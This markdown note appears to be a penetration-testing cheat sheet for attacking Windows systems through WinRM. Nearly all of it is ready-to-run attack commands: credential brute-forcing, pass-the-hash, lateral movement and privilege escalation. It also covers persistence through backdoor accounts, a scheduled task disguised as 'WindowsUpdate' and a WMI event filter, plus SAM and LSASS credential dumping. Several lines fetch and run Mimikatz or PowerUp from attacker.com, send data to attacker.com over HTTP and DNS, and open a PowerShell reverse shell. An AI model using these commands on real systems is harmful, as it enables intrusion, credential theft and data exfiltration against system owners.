---
id: Exploitation
aliases: []
tags:
  - Networking/Services/WinRM/Exploitation
---


<!-- Exploitation {{{-->
# Exploitation

<!-- Brute Force {{{-->
## Brute Force

Brute force WinRM credentials using various tools and techniques


WinRM Login Utility
([winrm_login](https://www.rapid7.com/db/modules/auxiliary/scanner/winrm/winrm_login/))

> [!warning]
>
> Only works if the remote end allows Negotiate (NTLM) authentication
>
> To use this module without SSL, the `AllowUnencrypted` WinRM option
> must be set
>
> Kerberos is not currently supported

> [!example]-
>
> ```sh
> use auxiliary/scanner/winrm/winrm_login
> set RHOSTS <target>
> set USER_FILE <users.txt>
> set PASS_FILE <passwords.txt>
> run
> ```

Using Custom Script

> [!example]-
>
> ```sh
> for user in $(cat <users.txt>); do
>   for pass in $(cat <passwords.txt>); do
>     echo "Trying $user:$pass"
>     evil-winrm -i <target> -u "$user" -p "$pass" -e /tmp/test
>   done
> done
> ```


Using [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec)

> [!warning]
>
> Deprecated

```sh
crackmapexec winrm target.com -u users.txt -p passwords.txt
```

___

<!-- }}} -->

<!-- Pass-the-Hash {{{-->
## Pass-the-Hash

Exploit NTLM hash authentication for WinRM access

Using [evil-winrm](https://github.com/Hackplayers/evil-winrm)
with NTLM hash

```sh
evil-winrm -i <target> -u administrator -H '32ed87bdb5fdc5e9cba88547376818d4'
```

WinRM Script Exec Remote Code Execution
([winrm_script_exec](https://www.rapid7.com/db/modules/exploit/windows/winrm/winrm_script_exec/))

> [!info]-
>
> This modules uses valid credentials to login to the WinRM service
> and execute a payload

> [!example]-
>
> ```sh
> use exploit/windows/winrm/winrm_script_exec
> set RHOSTS <target>
> set USERNAME administrator
> set HASH 32ed87bdb5fdc5e9cba88547376818d4
> run
> ```

Using [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec)

> [!warning]
>
> Deprecated

> [!example]-
>
> ```sh
> crackmapexec winrm <target> -u administrator -H '32ed87bdb5fdc5e9cba88547376818d4'
> ```

___

<!-- }}} -->

<!-- }}} -->

<!-- Post-Exploitation {{{-->
# Post-Exploitation

<!-- Configuration Check {{{-->
## Configuration Check

Check WinRM configuration and service status

Check if WinRM is running (*from target*)

```sh
Get-Service WinRM
```

Check WinRM configuration

```sh
winrm get winrm/config
```

Check listeners

```sh
winrm enumerate winrm/config/listener
```

Test if WinRM is accessible from remote

```sh
Test-WSMan -ComputerName target.com
```

___

<!-- }}} -->

<!-- Lateral Movement {{{-->
## Lateral Movement

Expand access to other systems using WinRM

Execute on multiple machines

> [!example]-
>
> ```sh
> $computers = Get-ADComputer -Filter * | Select -ExpandProperty Name
> ```
>
> ```sh
> Invoke-Command -ComputerName $computers -ScriptBlock { hostname }
> ```


Pass credentials to other systems

> [!example]-
>
> ```sh
> $cred = Get-Credential
> ```
>
> ```sh
> Invoke-Command -ComputerName server2 -Credential $cred -ScriptBlock {
>   # <commands>
> }
> ```

Copy files and execute

> [!example]-
>
> ```sh
> Copy-Item -Path payload.exe -Destination \\target\C$\Windows\Temp\
> ```
> ```sh
> Invoke-Command -ComputerName target -ScriptBlock {
>   C:\Windows\Temp\payload.exe
> }
> ```

PSRemoting through multiple hops

> [!example]-
>
> 1. Enable CredSSP on source
>
> ```sh
> Enable-WSManCredSSP -Role Client -DelegateComputer target.com
> ```
>
>
> 2. Execute with CredSSP
>
> ```sh
> $cred = Get-Credential
> ```
>
> ```sh
> Invoke-Command -ComputerName target.com -Credential $cred -Authentication CredSSP -ScriptBlock {
>   Invoke-Command -ComputerName target2.com -ScriptBlock { hostname }
> }
> ```

___

<!-- }}} -->

<!-- Privilege Escalation {{{-->
## Privilege Escalation

Escalate privileges on compromised WinRM systems

Check privileges

```sh
whoami /priv
```

Check for unquoted service paths

> [!info]-
>
> Windows can interpret unquoted service path components loosely,
> letting local attacker place a malicious executable
> in a higher-priority folder to run with service's privileges
> (*often `SYSTEM`*)


> [!example]-
>
> ```sh
> wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """
> ```

AlwaysInstallElevated check

> [!info]-
>
> Check whether the `AlwaysInstallElevated` policy is enabled
> for machine (`HKLM`) and user (`HKCU`) â€”
> if both are set to `1`, non-elevated MSI installs
> can run with `SYSTEM` privileges

> [!example]-
>
> ```sh
> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
> ```
> ```sh
> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
> ```

Check for stored credentials

> [!example]-
>
> ```sh
> cmdkey /list
> ```
> ```sh
> dir C:\Users\username\AppData\Local\Microsoft\Credentials\
> ```
> ```sh
> dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
> ```

Enumeration with
[PowerUp](https://powersploit.readthedocs.io/en/latest/Privesc/)

> [!example]-
>
> Download and Run [PowerUp](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)
>
> ```sh
> IEX(New-Object Net.WebClient).DownloadString('http://<attacker.com>/PowerUp.ps1')
> ```
> ```sh
> Invoke-AllChecks
> ```

___

<!-- }}} -->

<!-- Persistence {{{-->
## Persistence

Create persistent backdoor access to compromised WinRM systems

Create backdoor user

> [!example]-
>
> 1. Create new user
>
> ```sh
> net user <user> <password> /add
> ```
>
> 2. Add user to `administrators` group
>
> ```sh
> net localgroup administrators <user> /add
> ```
>
> 3. Add user to `Remote Desktop Users` group
>
> ```sh
> net localgroup "Remote Desktop Users" <user> /add
> ```

Registry Run key

> [!example]-
>
> Automatically launch `backdoor.exe` when that user logs in
>
> ```sh
> reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\Windows\Temp\backdoor.exe"
> ```

Scheduled task

> [!example]-
>
> Run `backdoor.exe` at logon with `SYSTEM` privileges
>
> ```sh
> schtasks /create /tn "WindowsUpdate" /tr "C:\Windows\Temp\backdoor.exe" /sc onlogon /ru SYSTEM
> ```

WMI event subscription

> [!info]-
>
> Create a WMI `__EventFilter` named `Backdoor` in `root\subscription`
> that fires every 60 seconds on changes to
> `Win32_PerfFormattedData_PerfOS_System`

> [!example]-
>
> ```sh
> $filter = Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments @{
>   Name = "Backdoor"
>   EventNameSpace = "root\cimv2"
>   QueryLanguage = "WQL"
>   Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
> }
> ```

___

<!-- }}} -->

<!-- Credential Harvesting {{{-->
## Credential Harvesting

Download files to the attacker machine

> [!example]-
>
> ```sh
> download C:\Windows\Temp\sam
> ```
> ```sh
> download C:\Windows\Temp\system
> ```
> ```sh
> download C:\Windows\Temp\security
> ```

Dump [SAM](https://en.wikipedia.org/wiki/Security_Account_Manager)
registry hives

> [!example]-
>
> `HKLM\SAM` hive contains local account password hashes
>
> ```sh
> reg save HKLM\SAM C:\Windows\Temp\sam
> ```
>
> `HKLM\SYSTEM` contains boot keys used to decrypt password hashes
>
> ```sh
> reg save HKLM\SYSTEM C:\Windows\Temp\system
> ```
>
> `HKLM\SECURITY` contains [LSA](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service)
> secrets which can contain service-accounts secrets, cached/secret credentials
> and keys an attacker can extract offline
>
> ```sh
> reg save HKLM\SECURITY C:\Windows\Temp\security
> ```

Dump [LSASS](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service)
(*requires admin*)

```sh
procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

Extract credentials with [[Mimikatz]]

> [!example]-
>
> 1. Run Mimikatz
>
> ```sh
> IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/Invoke-Mimikatz.ps1')
> Invoke-Mimikatz -DumpCreds
> ```
>
> 2. Extract credentials from memory
>
> ```sh
> privilege::debug
> ```
> ```sh
> sekurlsa::logonpasswords
> ```


___

<!-- }}} -->

<!-- File Operations {{{-->
## File Operations

Perform file operations on compromised WinRM systems

Upload file ([evil-winrm](https://github.com/Hackplayers/evil-winrm))

```sh
upload </local/path/file.exe> <C:\Windows\Temp\file.exe>
```

Download file ([evil-winrm](https://github.com/Hackplayers/evil-winrm))

```sh
download C:\Windows\System32\config\SAM </tmp/sam>
```

Copy files

```sh
Copy-Item -Path <\\source\share\file.txt> -Destination <C:\Temp\>
```

Search for interesting files

```sh
Get-ChildItem -Path C:\ -Include *.txt,*.pdf,*.doc,*.xls -Recurse -ErrorAction SilentlyContinue
```

Find passwords in files

```sh
Select-String -Path C:\*.txt,C:\*.config -Pattern "password"
```

___

<!-- }}} -->

<!-- Data Exfiltration {{{-->
## Data Exfiltration

Extract and exfiltrate sensitive data from compromised systems

Compress and exfiltrate data

> [!example]-
>
> 1. Compress data
>
> ```sh
> Compress-Archive -Path C:\Sensitive\ -DestinationPath C:\Temp\data.zip
> ```
>
> 2. Download via [evil-winrm](https://github.com/Hackplayers/evil-winrm)
>
> ```sh
> download C:\Temp\data.zip
> ```

Exfiltrate via HTTP

> [!example]-
>
> ```sh
> $data = Get-Content C:\Sensitive\data.txt
> ```
> ```sh
> Invoke-WebRequest -Uri "http://attacker.com/collect" -Method POST -Body $data
> ```

Base64 encode and exfiltrate

> [!example]-
>
> ```sh
> $bytes = [System.IO.File]::ReadAllBytes("C:\Sensitive\file.exe")
> ```
> ```sh
> $base64 = [System.Convert]::ToBase64String($bytes)
> ```
> ```sh
> Invoke-WebRequest -Uri "http://attacker.com/collect" -Method POST -Body $base64
> ```

DNS exfiltration

> [!example]-
>
> ```sh
> $data = Get-Content C:\data.txt
> ```
> ```sh
> $data | ForEach-Object {
>   nslookup "$_. attacker.com"
> }
> ```

___

<!-- }}} -->

<!-- Reverse Shell {{{-->
## Reverse Shell

Establish reverse shell connections for persistent access

PowerShell reverse shell

> [!example]-
>
> ```sh
> $client = New-Object System.Net.Sockets.TCPClient('attacker-ip',4444)
> $stream = $client.GetStream()
> [byte[]]$bytes = 0..65535|%{0}
> while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
>   $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
>   $sendback = (iex $data 2>&1 | Out-String )
>   $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '
>   $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
>   $stream.Write($sendbyte,0,$sendbyte.Length)
>   $stream.Flush()
> }
> ```
>
> One-liner PowerShell reverse shell
>
> ```sh
> powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('attacker-ip',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
> ```

<!-- }}} -->

<!-- Domain Reconnaissance {{{-->
## Domain Reconnaissance

Perform Active Directory reconnaissance using WinRM access

Domain information

> [!example]-
>
> ```sh
> Get-ADDomain
> [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
> ```

Domain controllers

> [!example]-
>
> ```sh
> Get-ADDomainController -Filter *
> ```
> ```sh
> [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().DomainControllers
> ```

Domain users

> [!example]-
>
> ```sh
> Get-ADUser -Filter * -Properties *
> ```
> ```sh
> net user /domain
> ```

Domain computers

> [!example]-
>
> ```sh
> Get-ADComputer -Filter *
> ```
> ```sh
> net view /domain
> ```

Domain groups

> [!example]-
>
> ```sh
> Get-ADGroup -Filter *
> ```
> ```sh
> net group /domain
> ```

Group members

> [!example]-
>
> ```sh
> Get-ADGroupMember "Domain Admins"
> ```
> ```sh
> net group "Domain Admins" /domain
> ```

GPOs

> [!example]-
>
> ```sh
> Get-GPO -All
> ```

___

<!-- }}} -->

<!-- }}} -->
